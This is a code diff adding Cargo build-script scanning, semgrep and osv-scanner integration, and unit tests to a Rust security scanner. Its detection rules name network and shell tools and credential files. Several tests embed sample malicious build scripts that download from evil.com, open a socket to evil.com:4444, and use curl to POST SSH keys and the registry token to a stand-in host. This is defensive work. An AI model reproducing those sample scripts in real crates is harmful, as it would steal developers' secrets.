@@ -3,6 +3,7 @@ use colored::Colorize;
 use regex::Regex;
 use std::fs;
 use std::path::{Path, PathBuf};
+use std::process::Command;
 use walkdir::WalkDir;
 
 #[derive(Parser)]
@@ -642,6 +643,550 @@ fn scan_vscode_dir(vscode_dir: &Path, verbose: bool) -> Vec<Finding> {
     findings
 }
 
+// ---- Cargo build script analysis ----
+
+/// Build-script-specific suspicious patterns (on top of the general content rules).
+fn build_script_rules() -> Vec<PatternRule> {
+    let rules = vec![
+        // Network access from build scripts
+        (r"(?i)(reqwest|hyper|ureq|attohttpc|minreq|curl)::|\bsurf\b", Severity::Critical, "Network library usage in build script"),
+        (r"(?i)TcpStream|UdpSocket|TcpListener", Severity::Critical, "Raw network socket in build script"),
+
+        // Arbitrary command execution
+        (r"Command::new\s*\(", Severity::Medium, "Command execution in build script (review target)"),
+        (r#"Command::new\s*\(\s*"(curl|wget|bash|sh|powershell|cmd|python|node|ruby|perl)"#, Severity::Critical, "Build script spawns network/shell/scripting command"),
+
+        // File system access outside OUT_DIR
+        (r#"(?i)(home_dir|home_directory|dirs::home|env::var\(\s*"HOME")"#, Severity::High, "Build script accesses home directory"),
+        (r"(?i)\.(ssh|gnupg|aws|npmrc|gitconfig|cargo/credentials)", Severity::Critical, "Build script references sensitive config file"),
+        (r#"(?i)env::var\(\s*"(USER|USERNAME|LOGNAME|HOSTNAME|SSH_AUTH_SOCK)"\s*\)"#, Severity::Medium, "Build script reads identity/environment info"),
+
+        // Writing outside standard paths
+        (r#"(?i)write\(|write_all\(|create\("#, Severity::Low, "File write in build script (verify target path)"),
+        (r"(?i)set_permissions|chmod", Severity::High, "Build script modifies file permissions"),
+
+        // Dynamic library loading
+        (r"(?i)(dlopen|LoadLibrary|libloading)", Severity::High, "Dynamic library loading in build script"),
+
+        // Include arbitrary bytes
+        (r"include_bytes!\s*\(", Severity::Medium, "include_bytes! in build script (embeds binary data)"),
+
+        // Accessing cargo credentials / registry tokens
+        (r"(?i)(CARGO_REGISTRY_TOKEN|cargo.credentials|crates.io)", Severity::Critical, "Build script references cargo registry credentials"),
+    ];
+
+    rules
+        .into_iter()
+        .filter_map(|(pat, sev, desc)| {
+            Regex::new(pat).ok().map(|r| PatternRule {
+                pattern: r,
+                severity: sev,
+                description: desc,
+            })
+        })
+        .collect()
+}
+
+/// Information about a dependency's build script.
+#[derive(Debug)]
+struct BuildScriptInfo {
+    package_name: String,
+    package_version: String,
+    build_script_path: PathBuf,
+}
+
+/// Run `cargo metadata` and collect all dependencies that have a build script.
+fn collect_build_scripts(root: &Path) -> Result<Vec<BuildScriptInfo>, String> {
+    let output = Command::new("cargo")
+        .args(["metadata", "--format-version", "1"])
+        .current_dir(root)
+        .output()
+        .map_err(|e| format!("Failed to run cargo metadata: {}", e))?;
+
+    if !output.status.success() {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        return Err(format!("cargo metadata failed: {}", stderr));
+    }
+
+    let metadata: serde_json::Value = serde_json::from_slice(&output.stdout)
+        .map_err(|e| format!("Failed to parse cargo metadata JSON: {}", e))?;
+
+    let mut build_scripts = Vec::new();
+
+    if let Some(packages) = metadata.get("packages").and_then(|p| p.as_array()) {
+        for pkg in packages {
+            let name = pkg.get("name").and_then(|n| n.as_str()).unwrap_or("unknown");
+            let version = pkg.get("version").and_then(|v| v.as_str()).unwrap_or("0.0.0");
+            let manifest_path = pkg
+                .get("manifest_path")
+                .and_then(|m| m.as_str())
+                .unwrap_or("");
+
+            if manifest_path.is_empty() {
+                continue;
+            }
+
+            let crate_dir = Path::new(manifest_path).parent().unwrap_or(Path::new(""));
+
+            // Check the `build` field in targets
+            let has_build_script = pkg
+                .get("targets")
+                .and_then(|t| t.as_array())
+                .map(|targets| {
+                    targets.iter().any(|t| {
+                        t.get("kind")
+                            .and_then(|k| k.as_array())
+                            .map(|kinds| kinds.iter().any(|k| k.as_str() == Some("custom-build")))
+                            .unwrap_or(false)
+                    })
+                })
+                .unwrap_or(false);
+
+            if has_build_script {
+                // Find the actual build script path from the target entry
+                let build_path = pkg
+                    .get("targets")
+                    .and_then(|t| t.as_array())
+                    .and_then(|targets| {
+                        targets.iter().find_map(|t| {
+                            let is_build = t
+                                .get("kind")
+                                .and_then(|k| k.as_array())
+                                .map(|kinds| kinds.iter().any(|k| k.as_str() == Some("custom-build")))
+                                .unwrap_or(false);
+                            if is_build {
+                                t.get("src_path").and_then(|s| s.as_str()).map(PathBuf::from)
+                            } else {
+                                None
+                            }
+                        })
+                    })
+                    .unwrap_or_else(|| crate_dir.join("build.rs"));
+
+                if build_path.exists() {
+                    build_scripts.push(BuildScriptInfo {
+                        package_name: name.to_string(),
+                        package_version: version.to_string(),
+                        build_script_path: build_path,
+                    });
+                }
+            }
+        }
+    }
+
+    Ok(build_scripts)
+}
+
+/// Analyze a single build script file.
+fn analyze_build_script(
+    info: &BuildScriptInfo,
+    content: &str,
+    general_rules: &[PatternRule],
+    build_rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let file_str = info.build_script_path.display().to_string();
+
+    // Apply build-script-specific rules
+    for (line_num, line) in content.lines().enumerate() {
+        for rule in build_rules {
+            if rule.pattern.is_match(line) {
+                findings.push(
+                    Finding::new(rule.severity.clone(), &file_str, rule.description)
+                        .with_match(line.trim(), line_num + 1),
+                );
+            }
+        }
+    }
+
+    // Apply general content rules (network, obfuscation, etc.)
+    analyze_file_content(&info.build_script_path, content, general_rules, findings);
+
+    // Check for obfuscated/minified content
+    for (line_num, line) in content.lines().enumerate() {
+        if line.len() > 500 && !line.starts_with("//") && !line.starts_with("///") {
+            findings.push(
+                Finding::new(
+                    Severity::High,
+                    &file_str,
+                    "Extremely long line in build script (possible obfuscation)",
+                )
+                .with_match(&truncate(line.trim(), 100), line_num + 1),
+            );
+        }
+    }
+}
+
+/// Main entry point for scanning cargo build scripts.
+fn scan_cargo_build_scripts(root: &Path, verbose: bool) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    let build_scripts = match collect_build_scripts(root) {
+        Ok(scripts) => scripts,
+        Err(e) => {
+            findings.push(Finding::new(
+                Severity::Low,
+                &root.display().to_string(),
+                &format!("Could not collect cargo build scripts: {}", e),
+            ));
+            return findings;
+        }
+    };
+
+    if build_scripts.is_empty() {
+        println!("  No dependencies with build scripts found.");
+        return findings;
+    }
+
+    println!(
+        "  Found {} dependencies with build scripts:\n",
+        build_scripts.len()
+    );
+    for info in &build_scripts {
+        println!(
+            "    {} {} v{}",
+            "-".dimmed(),
+            info.package_name.bold(),
+            info.package_version
+        );
+        if verbose {
+            println!("      {}", info.build_script_path.display().to_string().dimmed());
+        }
+    }
+    println!();
+
+    let general_rules = build_content_rules();
+    let build_rules = build_script_rules();
+
+    for info in &build_scripts {
+        match fs::read_to_string(&info.build_script_path) {
+            Ok(content) => {
+                let before = findings.len();
+                analyze_build_script(info, &content, &general_rules, &build_rules, &mut findings);
+                let new_findings = findings.len() - before;
+
+                if verbose && new_findings > 0 {
+                    println!(
+                        "  {} {} ({} findings)",
+                        info.package_name.bold(),
+                        info.build_script_path.display().to_string().dimmed(),
+                        new_findings,
+                    );
+                }
+            }
+            Err(e) => {
+                findings.push(Finding::new(
+                    Severity::Low,
+                    &info.build_script_path.display().to_string(),
+                    &format!(
+                        "Could not read build script for {} v{}: {}",
+                        info.package_name, info.package_version, e
+                    ),
+                ));
+            }
+        }
+    }
+
+    findings
+}
+
+// ---- External tool integration: semgrep ----
+
+/// Check if a command is available on PATH.
+fn is_tool_available(name: &str) -> bool {
+    Command::new("which")
+        .arg(name)
+        .output()
+        .map(|o| o.status.success())
+        .unwrap_or(false)
+}
+
+/// Map semgrep severity string to our Severity.
+fn semgrep_severity(s: &str) -> Severity {
+    match s {
+        "ERROR" => Severity::Critical,
+        "WARNING" => Severity::High,
+        "INFO" => Severity::Medium,
+        _ => Severity::Low,
+    }
+}
+
+/// Parse semgrep JSON output into findings.
+fn parse_semgrep_json(json_str: &str) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let Ok(val) = serde_json::from_str::<serde_json::Value>(json_str) else {
+        return findings;
+    };
+    let Some(results) = val.get("results").and_then(|r| r.as_array()) else {
+        return findings;
+    };
+
+    for result in results {
+        let check_id = result
+            .get("check_id")
+            .and_then(|c| c.as_str())
+            .unwrap_or("unknown");
+        let path = result
+            .get("path")
+            .and_then(|p| p.as_str())
+            .unwrap_or("unknown");
+        let line = result
+            .get("start")
+            .and_then(|s| s.get("line"))
+            .and_then(|l| l.as_u64())
+            .map(|l| l as usize);
+        let severity_str = result
+            .get("extra")
+            .and_then(|e| e.get("severity"))
+            .and_then(|s| s.as_str())
+            .unwrap_or("INFO");
+        let message = result
+            .get("extra")
+            .and_then(|e| e.get("message"))
+            .and_then(|m| m.as_str())
+            .unwrap_or("");
+        let matched_lines = result
+            .get("extra")
+            .and_then(|e| e.get("lines"))
+            .and_then(|l| l.as_str())
+            .unwrap_or("");
+
+        let severity = semgrep_severity(severity_str);
+        let desc = format!("[semgrep] {}: {}", check_id, truncate(message, 200));
+        let mut finding = Finding::new(severity, path, &desc);
+        if let Some(l) = line {
+            finding = finding.with_match(matched_lines, l);
+        }
+        findings.push(finding);
+    }
+
+    // Also report errors from semgrep
+    if let Some(errors) = val.get("errors").and_then(|e| e.as_array()) {
+        for err in errors {
+            let msg = err
+                .get("message")
+                .and_then(|m| m.as_str())
+                .or_else(|| err.get("long_msg").and_then(|m| m.as_str()))
+                .unwrap_or("unknown error");
+            let path = err
+                .get("path")
+                .and_then(|p| p.as_str())
+                .unwrap_or("semgrep");
+            // Only include if it looks like a real issue, not a parse warning
+            if !msg.contains("Skipping") && !msg.contains("parsing") {
+                findings.push(Finding::new(
+                    Severity::Low,
+                    path,
+                    &format!("[semgrep error] {}", truncate(msg, 150)),
+                ));
+            }
+        }
+    }
+
+    findings
+}
+
+/// Run semgrep scan on the target directory.
+fn run_semgrep(root: &Path) -> Vec<Finding> {
+    if !is_tool_available("semgrep") {
+        println!(
+            "  {}",
+            "semgrep not found on PATH, skipping. Install: pip install semgrep"
+                .yellow()
+        );
+        return Vec::new();
+    }
+
+    println!("  Running semgrep with security-audit rules...");
+
+    let output = Command::new("semgrep")
+        .args([
+            "scan",
+            "--config", "p/security-audit",
+            "--config", "p/secrets",
+            "--json",
+            "--quiet",
+            "--no-git-ignore",
+            "--timeout", "30",
+        ])
+        .arg(root)
+        .output();
+
+    match output {
+        Ok(out) => {
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            if stdout.trim().is_empty() {
+                println!("  semgrep produced no output.");
+                return Vec::new();
+            }
+            parse_semgrep_json(&stdout)
+        }
+        Err(e) => {
+            vec![Finding::new(
+                Severity::Low,
+                "semgrep",
+                &format!("Failed to run semgrep: {}", e),
+            )]
+        }
+    }
+}
+
+// ---- External tool integration: osv-scanner ----
+
+/// Map CVSS score or OSV severity to our Severity.
+fn osv_severity_from_score(score: f64) -> Severity {
+    if score >= 9.0 {
+        Severity::Critical
+    } else if score >= 7.0 {
+        Severity::High
+    } else if score >= 4.0 {
+        Severity::Medium
+    } else {
+        Severity::Low
+    }
+}
+
+/// Parse osv-scanner JSON output into findings.
+fn parse_osv_json(json_str: &str) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let Ok(val) = serde_json::from_str::<serde_json::Value>(json_str) else {
+        return findings;
+    };
+    let Some(results) = val.get("results").and_then(|r| r.as_array()) else {
+        return findings;
+    };
+
+    for result in results {
+        let source_path = result
+            .get("source")
+            .and_then(|s| s.get("path"))
+            .and_then(|p| p.as_str())
+            .unwrap_or("unknown");
+
+        let Some(packages) = result.get("packages").and_then(|p| p.as_array()) else {
+            continue;
+        };
+
+        for pkg_entry in packages {
+            let pkg_name = pkg_entry
+                .get("package")
+                .and_then(|p| p.get("name"))
+                .and_then(|n| n.as_str())
+                .unwrap_or("unknown");
+            let pkg_version = pkg_entry
+                .get("package")
+                .and_then(|p| p.get("version"))
+                .and_then(|v| v.as_str())
+                .unwrap_or("?");
+            let pkg_ecosystem = pkg_entry
+                .get("package")
+                .and_then(|p| p.get("ecosystem"))
+                .and_then(|e| e.as_str())
+                .unwrap_or("?");
+
+            let Some(vulns) = pkg_entry.get("vulnerabilities").and_then(|v| v.as_array()) else {
+                continue;
+            };
+
+            for vuln in vulns {
+                let vuln_id = vuln
+                    .get("id")
+                    .and_then(|i| i.as_str())
+                    .unwrap_or("unknown");
+                let summary = vuln
+                    .get("summary")
+                    .and_then(|s| s.as_str())
+                    .unwrap_or("No summary available");
+                let aliases: Vec<&str> = vuln
+                    .get("aliases")
+                    .and_then(|a| a.as_array())
+                    .map(|arr| {
+                        arr.iter()
+                            .filter_map(|v| v.as_str())
+                            .collect()
+                    })
+                    .unwrap_or_default();
+
+                // Try to extract a CVSS score from database_specific or severity
+                let score = vuln
+                    .get("severity")
+                    .and_then(|s| s.as_array())
+                    .and_then(|arr| {
+                        arr.iter().find_map(|s| {
+                            s.get("score")
+                                .and_then(|sc| sc.as_str())
+                                .and_then(|sc| {
+                                    // CVSS vector: extract base score
+                                    // Or it might be a direct score
+                                    sc.parse::<f64>().ok()
+                                })
+                        })
+                    })
+                    .unwrap_or(5.0); // default to medium if no score
+
+                let severity = osv_severity_from_score(score);
+
+                let alias_str = if aliases.is_empty() {
+                    String::new()
+                } else {
+                    format!(" ({})", aliases.join(", "))
+                };
+
+                let desc = format!(
+                    "[osv] {} v{} [{}]: {}{} - {}",
+                    pkg_name,
+                    pkg_version,
+                    pkg_ecosystem,
+                    vuln_id,
+                    alias_str,
+                    truncate(summary, 150),
+                );
+
+                findings.push(Finding::new(severity, source_path, &desc));
+            }
+        }
+    }
+
+    findings
+}
+
+/// Run osv-scanner on the target directory.
+fn run_osv_scanner(root: &Path) -> Vec<Finding> {
+    if !is_tool_available("osv-scanner") {
+        println!(
+            "  {}",
+            "osv-scanner not found on PATH, skipping. Install: https://github.com/google/osv-scanner"
+                .yellow()
+        );
+        return Vec::new();
+    }
+
+    println!("  Running osv-scanner for known vulnerabilities...");
+
+    let output = Command::new("osv-scanner")
+        .args(["scan", "source", "--format", "json", "-r"])
+        .arg(root)
+        .output();
+
+    match output {
+        Ok(out) => {
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            if stdout.trim().is_empty() {
+                println!("  osv-scanner produced no output.");
+                return Vec::new();
+            }
+            parse_osv_json(&stdout)
+        }
+        Err(e) => {
+            vec![Finding::new(
+                Severity::Low,
+                "osv-scanner",
+                &format!("Failed to run osv-scanner: {}", e),
+            )]
+        }
+    }
+}
+
 fn truncate(s: &str, max_len: usize) -> String {
     if s.len() > max_len {
         format!("{}...", &s[..max_len])
@@ -806,19 +1351,82 @@ fn main() {
         print_findings(&findings);
     }
 
+    // Scan cargo build scripts
+    let mut cargo_scanned = false;
+    if root.join("Cargo.toml").exists() {
+        scanned_anything = true;
+        cargo_scanned = true;
+        println!(
+            "\n{} {} (cargo build scripts)",
+            "Scanning:".bold(),
+            root.display()
+        );
+        println!("{}", "-".repeat(60));
+
+        let findings = scan_cargo_build_scripts(root, cli.verbose);
+        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+            any_critical = true;
+        }
+        total_findings += findings.len();
+        print_findings(&findings);
+    }
+
+    // Run semgrep
+    println!(
+        "\n{} {} (semgrep)",
+        "Scanning:".bold(),
+        root.display()
+    );
+    println!("{}", "-".repeat(60));
+    let semgrep_findings = run_semgrep(root);
+    if !semgrep_findings.is_empty() {
+        scanned_anything = true;
+        if semgrep_findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+            any_critical = true;
+        }
+        total_findings += semgrep_findings.len();
+        print_findings(&semgrep_findings);
+    } else {
+        println!("  {}", "No semgrep findings.".green());
+    }
+
+    // Run osv-scanner
+    println!(
+        "\n{} {} (osv-scanner)",
+        "Scanning:".bold(),
+        root.display()
+    );
+    println!("{}", "-".repeat(60));
+    let osv_findings = run_osv_scanner(root);
+    if !osv_findings.is_empty() {
+        scanned_anything = true;
+        if osv_findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+            any_critical = true;
+        }
+        total_findings += osv_findings.len();
+        print_findings(&osv_findings);
+    } else {
+        println!("  {}", "No known vulnerabilities found.".green());
+    }
+
     if !scanned_anything {
-        println!("{}", "No .vscode directory or git hooks found.".yellow());
+        println!("{}", "No .vscode directory, git hooks, or Cargo.toml found, and external scanners found nothing.".yellow());
         std::process::exit(0);
     }
 
-    let total_scanned = vscode_dirs.len() + git_roots.len();
+    let total_scanned = vscode_dirs.len()
+        + git_roots.len()
+        + cargo_scanned as usize
+        + (!semgrep_findings.is_empty()) as usize
+        + (!osv_findings.is_empty()) as usize;
     if total_scanned > 1 {
         println!("\n{}", "=== Overall Summary ===".bold());
         println!(
-            "Scanned {} locations ({} .vscode, {} git), {} total findings",
+            "Scanned {} sources ({} .vscode, {} git, {} cargo, semgrep, osv-scanner), {} total findings",
             total_scanned,
             vscode_dirs.len(),
             git_roots.len(),
+            cargo_scanned as usize,
             total_findings,
         );
     }
@@ -1316,5 +1924,548 @@ mod tests {
             .filter(|f| matches!(f.severity, Severity::Critical))
             .count();
         assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+    }
+
+    // ---- Cargo build script helpers ----
+
+    /// Directly analyze a build script string as if it belonged to a given package.
+    fn analyze_build_script_content(pkg_name: &str, content: &str) -> Vec<Finding> {
+        let dir = tempfile::tempdir().unwrap();
+        let build_rs = dir.path().join("build.rs");
+        fs::write(&build_rs, content).unwrap();
+
+        let info = BuildScriptInfo {
+            package_name: pkg_name.to_string(),
+            package_version: "0.0.0".to_string(),
+            build_script_path: build_rs,
+        };
+
+        let general_rules = build_content_rules();
+        let build_rules = build_script_rules();
+        let mut findings = Vec::new();
+        analyze_build_script(&info, content, &general_rules, &build_rules, &mut findings);
+        findings
+    }
+
+    // ---- Cargo build script tests ----
+
+    #[test]
+    fn build_script_benign_cc_is_low_risk() {
+        let findings = analyze_build_script_content("some-sys", r#"
+fn main() {
+    cc::Build::new()
+        .file("src/foo.c")
+        .compile("foo");
+    println!("cargo:rerun-if-changed=src/foo.c");
+}
+"#);
+        assert!(!has_severity(&findings, "Critical"));
+        assert!(!has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn build_script_command_new_is_flagged() {
+        let findings = analyze_build_script_content("sketchy-crate", r#"
+use std::process::Command;
+fn main() {
+    Command::new("cmake")
+        .args(&[".", "-B", "build"])
+        .status()
+        .unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "Command execution in build script"));
+    }
+
+    #[test]
+    fn build_script_spawns_curl_is_critical() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+use std::process::Command;
+fn main() {
+    Command::new("curl")
+        .args(&["http://evil.com/payload", "-o", "/tmp/payload"])
+        .status()
+        .unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn build_script_spawns_bash_is_critical() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+use std::process::Command;
+fn main() {
+    Command::new("bash")
+        .arg("-c")
+        .arg("echo pwned")
+        .status()
+        .unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
+    }
+
+    #[test]
+    fn build_script_spawns_python_is_critical() {
+        let findings = analyze_build_script_content("sneaky-crate", r#"
+use std::process::Command;
+fn main() {
+    Command::new("python")
+        .arg("setup.py")
+        .status()
+        .unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
+    }
+
+    #[test]
+    fn build_script_network_library_is_critical() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+fn main() {
+    let resp = reqwest::blocking::get("http://evil.com/config").unwrap();
+    std::fs::write("/tmp/config", resp.bytes().unwrap()).unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "Network library usage in build script"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn build_script_tcp_stream_is_critical() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+use std::net::TcpStream;
+fn main() {
+    let _stream = TcpStream::connect("evil.com:4444").unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "Raw network socket in build script"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn build_script_home_dir_access_is_high() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+fn main() {
+    let home = dirs::home_dir().unwrap();
+    let data = std::fs::read_to_string(home.join(".bashrc")).unwrap();
+    println!("{}", data);
+}
+"#);
+        // The pattern matches "home_dir" substring
+        assert!(has_description_containing(&findings, "Build script accesses home directory"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn build_script_reads_ssh_keys_is_critical() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+fn main() {
+    let key = std::fs::read_to_string(
+        std::path::Path::new(&std::env::var("HOME").unwrap()).join(".ssh/id_rsa")
+    ).unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "references sensitive config file"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn build_script_reads_cargo_credentials_is_critical() {
+        let findings = analyze_build_script_content("evil-crate", r#"
+fn main() {
+    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap();
+    // exfiltrate token
+}
+"#);
+        assert!(has_description_containing(&findings, "cargo registry credentials"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn build_script_chmod_is_high() {
+        let findings = analyze_build_script_content("sketchy-crate", r#"
+use std::os::unix::fs::PermissionsExt;
+fn main() {
+    let perms = std::fs::Permissions::from_mode(0o755);
+    std::fs::set_permissions("/tmp/binary", perms).unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "modifies file permissions"));
+    }
+
+    #[test]
+    fn build_script_dlopen_is_high() {
+        let findings = analyze_build_script_content("sketchy-crate", r#"
+fn main() {
+    let lib = libloading::Library::new("/tmp/evil.so").unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "Dynamic library loading"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn build_script_env_identity_is_medium() {
+        let findings = analyze_build_script_content("curious-crate", r#"
+fn main() {
+    let user = std::env::var("USER").unwrap();
+    println!("cargo:warning=building for {}", user);
+}
+"#);
+        assert!(has_description_containing(&findings, "reads identity/environment info"));
+    }
+
+    #[test]
+    fn build_script_obfuscated_long_line_is_high() {
+        let long_line = format!("let x = \"{}\";", "A".repeat(600));
+        let content = format!("fn main() {{\n    {}\n}}", long_line);
+        let findings = analyze_build_script_content("obfuscated-crate", &content);
+        assert!(has_description_containing(&findings, "Extremely long line in build script"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn build_script_include_bytes_is_medium() {
+        let findings = analyze_build_script_content("embed-crate", r#"
+fn main() {
+    let data = include_bytes!("blob.bin");
+    std::fs::write(std::env::var("OUT_DIR").unwrap() + "/blob.bin", data).unwrap();
+}
+"#);
+        assert!(has_description_containing(&findings, "include_bytes!"));
+    }
+
+    #[test]
+    fn build_script_full_malicious() {
+        let findings = analyze_build_script_content("full-evil", r#"
+use std::process::Command;
+fn main() {
+    // Steal SSH keys
+    let home = std::env::var("HOME").unwrap();
+    let key = std::fs::read_to_string(format!("{}/.ssh/id_rsa", home)).unwrap();
+    // Exfiltrate via network
+    let _stream = std::net::TcpStream::connect("evil.com:4444").unwrap();
+    // Also grab cargo credentials
+    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
+    Command::new("curl")
+        .args(&["-X", "POST", "-d", &format!("{}:{}", key, token), "http://evil.com/collect"])
+        .status()
+        .unwrap();
+}
+"#);
+        let critical_count = findings
+            .iter()
+            .filter(|f| matches!(f.severity, Severity::Critical))
+            .count();
+        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+    }
+
+    // ---- Semgrep JSON parsing tests ----
+
+    #[test]
+    fn semgrep_parse_empty_results() {
+        let json = r#"{"results": [], "errors": []}"#;
+        let findings = parse_semgrep_json(json);
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn semgrep_parse_invalid_json() {
+        let findings = parse_semgrep_json("not json at all");
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn semgrep_parse_error_severity() {
+        let json = r#"{
+            "results": [{
+                "check_id": "python.lang.security.audit.eval-detected",
+                "path": "app.py",
+                "start": {"line": 10, "col": 1, "offset": 0},
+                "end": {"line": 10, "col": 20, "offset": 19},
+                "extra": {
+                    "message": "Detected eval() usage with dynamic content",
+                    "severity": "ERROR",
+                    "lines": "eval(user_input)"
+                }
+            }],
+            "errors": []
+        }"#;
+        let findings = parse_semgrep_json(json);
+        assert_eq!(findings.len(), 1);
+        assert!(has_severity(&findings, "Critical"));
+        assert!(has_description_containing(&findings, "eval-detected"));
+        assert_eq!(findings[0].line_number, Some(10));
+    }
+
+    #[test]
+    fn semgrep_parse_warning_severity() {
+        let json = r#"{
+            "results": [{
+                "check_id": "generic.secrets.security.detected-api-key",
+                "path": "config.py",
+                "start": {"line": 5, "col": 1, "offset": 0},
+                "end": {"line": 5, "col": 40, "offset": 39},
+                "extra": {
+                    "message": "Hardcoded API key detected",
+                    "severity": "WARNING",
+                    "lines": "API_KEY = 'sk-1234567890abcdef'"
+                }
+            }],
+            "errors": []
+        }"#;
+        let findings = parse_semgrep_json(json);
+        assert_eq!(findings.len(), 1);
+        assert!(has_severity(&findings, "High"));
+        assert!(has_description_containing(&findings, "api-key"));
+    }
+
+    #[test]
+    fn semgrep_parse_info_severity() {
+        let json = r#"{
+            "results": [{
+                "check_id": "python.lang.best-practice.open-never-closed",
+                "path": "util.py",
+                "start": {"line": 3, "col": 1, "offset": 0},
+                "end": {"line": 3, "col": 20, "offset": 19},
+                "extra": {
+                    "message": "File opened but never closed",
+                    "severity": "INFO",
+                    "lines": "f = open('data.txt')"
+                }
+            }],
+            "errors": []
+        }"#;
+        let findings = parse_semgrep_json(json);
+        assert_eq!(findings.len(), 1);
+        assert!(has_severity(&findings, "Medium"));
+    }
+
+    #[test]
+    fn semgrep_parse_multiple_results() {
+        let json = r#"{
+            "results": [
+                {
+                    "check_id": "rule.one",
+                    "path": "a.py",
+                    "start": {"line": 1, "col": 1, "offset": 0},
+                    "end": {"line": 1, "col": 10, "offset": 9},
+                    "extra": {"message": "Issue one", "severity": "ERROR", "lines": "bad()"}
+                },
+                {
+                    "check_id": "rule.two",
+                    "path": "b.py",
+                    "start": {"line": 5, "col": 1, "offset": 0},
+                    "end": {"line": 5, "col": 10, "offset": 9},
+                    "extra": {"message": "Issue two", "severity": "WARNING", "lines": "worse()"}
+                },
+                {
+                    "check_id": "rule.three",
+                    "path": "c.py",
+                    "start": {"line": 8, "col": 1, "offset": 0},
+                    "end": {"line": 8, "col": 10, "offset": 9},
+                    "extra": {"message": "Issue three", "severity": "INFO", "lines": "meh()"}
+                }
+            ],
+            "errors": []
+        }"#;
+        let findings = parse_semgrep_json(json);
+        assert_eq!(findings.len(), 3);
+        assert!(has_severity(&findings, "Critical"));
+        assert!(has_severity(&findings, "High"));
+        assert!(has_severity(&findings, "Medium"));
+    }
+
+    #[test]
+    fn semgrep_parse_with_matched_lines() {
+        let json = r#"{
+            "results": [{
+                "check_id": "test.rule",
+                "path": "test.py",
+                "start": {"line": 42, "col": 1, "offset": 0},
+                "end": {"line": 42, "col": 20, "offset": 19},
+                "extra": {
+                    "message": "Bad pattern",
+                    "severity": "WARNING",
+                    "lines": "os.system(cmd)"
+                }
+            }],
+            "errors": []
+        }"#;
+        let findings = parse_semgrep_json(json);
+        assert_eq!(findings[0].line_number, Some(42));
+        assert_eq!(findings[0].matched_content.as_deref(), Some("os.system(cmd)"));
+    }
+
+    // ---- OSV-scanner JSON parsing tests ----
+
+    #[test]
+    fn osv_parse_empty_results() {
+        let json = r#"{"results": []}"#;
+        let findings = parse_osv_json(json);
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn osv_parse_invalid_json() {
+        let findings = parse_osv_json("garbage");
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn osv_parse_single_vulnerability() {
+        let json = r#"{
+            "results": [{
+                "source": {"path": "Cargo.lock", "type": "lockfile"},
+                "packages": [{
+                    "package": {
+                        "name": "hyper",
+                        "version": "0.14.1",
+                        "ecosystem": "crates.io"
+                    },
+                    "vulnerabilities": [{
+                        "id": "GHSA-xxxx-yyyy-zzzz",
+                        "summary": "Denial of service via malformed headers",
+                        "aliases": ["CVE-2023-12345"],
+                        "severity": [{"type": "CVSS_V3", "score": "7.5"}]
+                    }]
+                }]
+            }]
+        }"#;
+        let findings = parse_osv_json(json);
+        assert_eq!(findings.len(), 1);
+        assert!(has_description_containing(&findings, "hyper"));
+        assert!(has_description_containing(&findings, "GHSA-xxxx-yyyy-zzzz"));
+        assert!(has_description_containing(&findings, "CVE-2023-12345"));
+        assert!(has_description_containing(&findings, "Denial of service"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn osv_parse_critical_severity() {
+        let json = r#"{
+            "results": [{
+                "source": {"path": "package-lock.json", "type": "lockfile"},
+                "packages": [{
+                    "package": {
+                        "name": "lodash",
+                        "version": "4.17.15",
+                        "ecosystem": "npm"
+                    },
+                    "vulnerabilities": [{
+                        "id": "GHSA-aaaa-bbbb-cccc",
+                        "summary": "Remote code execution via prototype pollution",
+                        "aliases": ["CVE-2021-99999"],
+                        "severity": [{"type": "CVSS_V3", "score": "9.8"}]
+                    }]
+                }]
+            }]
+        }"#;
+        let findings = parse_osv_json(json);
+        assert_eq!(findings.len(), 1);
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
